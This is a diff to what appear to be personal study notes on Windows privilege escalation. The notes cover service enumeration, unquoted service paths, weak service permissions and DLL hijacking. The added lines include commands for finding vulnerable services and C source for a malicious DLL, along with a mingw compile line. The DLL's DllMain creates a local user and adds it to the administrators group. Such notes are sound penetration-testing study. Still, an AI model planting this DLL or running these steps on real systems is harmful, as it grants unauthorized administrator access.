@@ -1,3 +1,23 @@
+- [[#Enummeration|Enummeration]]
+	- [[#Enummeration#Situational Awarness|Situational Awarness]]
+	- [[#Enummeration#Hidden in Plain View|Hidden in Plain View]]
+	- [[#Enummeration#Information Goldmine PowerShell|Information Goldmine PowerShell]]
+	- [[#Enummeration#Automated Enumeration|Automated Enumeration]]
+- [[#Windows Services|Windows Services]]
+	- [[#Windows Services#Basic Info|Basic Info]]
+	- [[#Windows Services#Service Binary Hijacking|Service Binary Hijacking]]
+	- [[#Windows Services#Unquoted Service Path|Unquoted Service Path]]
+	- [[#Windows Services#Weak Service Permissions|Weak Service Permissions]]
+	- [[#Windows Services#Weak Service Binary Permissions|Weak Service Binary Permissions]]
+- [[#DLL Hijacking|DLL Hijacking]]
+- [[#Other windows components|Other windows components]]
+	- [[#Other windows components#UAC Bypass|UAC Bypass]]
+	- [[#Other windows components#Scheduled Tasks|Scheduled Tasks]]
+	- [[#Other windows components#Using Exploits|Using Exploits]]
+		- [[#Using Exploits#SeImpersonatePrivilege|SeImpersonatePrivilege]]
+		- [[#Using Exploits#Print Spoofer|Print Spoofer]]
+		- [[#Using Exploits#Rogue Potato|Rogue Potato]]
+		- [[#Using Exploits#Juicy Potato|Juicy Potato]]
 ## Enummeration
 
 Common methods for privilege escalation include Operating System or 3rd party software misconfigurations and missing patches.
@@ -81,6 +101,11 @@ Get-CimInstance -ClassName win32_service | Select Name, StartMode | Where-Object
 net stop mysql
 ```
 
+### Service Binary Hijacking
+
+```
+Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}
+```
 ### Unquoted Service Path
 
 ^d67f75
@@ -90,6 +115,7 @@ If we have write permission on one previous directory and we can restart the ser
 
 ```cmd
 wmic service get name, pathname
+wmic service get name,pathname |  findstr /i /v "C:\Windows\\" | findstr /i /v """
 icacls "C:\Program Files\Vulnerable Services" | fl
 sc stop VulnService1
 ```
@@ -97,6 +123,8 @@ sc stop VulnService1
 ```
 Get-CimInstance -ClassName win32_service | Select Name,State,PathName
 Get-ACL .\directory
+Start-Service GammaService
+Stop-Service GammaService
 ```
 
 ### Weak Service Permissions
@@ -135,7 +163,7 @@ This is a slight variation on the previous vulnerability but instead of the weak
 Get-Acl -Path "C:\Program Files\Vulnerable Services\Service 3.exe" | fl
 ```
 
-### DLL Hijacking
+## DLL Hijacking
 
 ^93f25e
 
@@ -151,8 +179,38 @@ We can try placing a malicious DLL (with the name of the missing DLL) in a path 
 	Listing 56 - Standard DLL search order on current Windows versions
 
 We use Procmon (admin privs, so we can get the binary and run it on our machine)
+copy the service binary to a local machine. On this system, we can install the service locally and use Process Monitor with administrative privileges to list all DLL activity.
+![[Pasted image 20260524082128.png]]
 
-![[Pasted image 20240527175432.png]]Try to restart the service/start when procmon is on, in order to get all the events:
+`x86_64-w64-mingw32-gcc TextShaping.cpp --shared -o TextShaping.dll`
+```c
+#include <stdlib.h>
+#include <windows.h>
+
+BOOL APIENTRY DllMain(
+HANDLE hModule,// Handle to DLL module
+DWORD ul_reason_for_call,// Reason for calling function
+LPVOID lpReserved ) // Reserved
+{
+    switch ( ul_reason_for_call )
+    {
+        case DLL_PROCESS_ATTACH: // A process is loading the DLL.
+        int i;
+  	    i = system ("net user dave3 password123! /add");
+  	    i = system ("net localgroup administrators dave3 /add");
+        break;
+        case DLL_THREAD_ATTACH: // A process is creating a new thread.
+        break;
+        case DLL_THREAD_DETACH: // A thread exits normally.
+        break;
+        case DLL_PROCESS_DETACH: // A process unloads the DLL.
+        break;
+    }
+    return TRUE;
+}
+```
+
+Try to restart the service/start when procmon is on, in order to get all the events:
 ```powershell
 Restart-Service BetaService
 ```
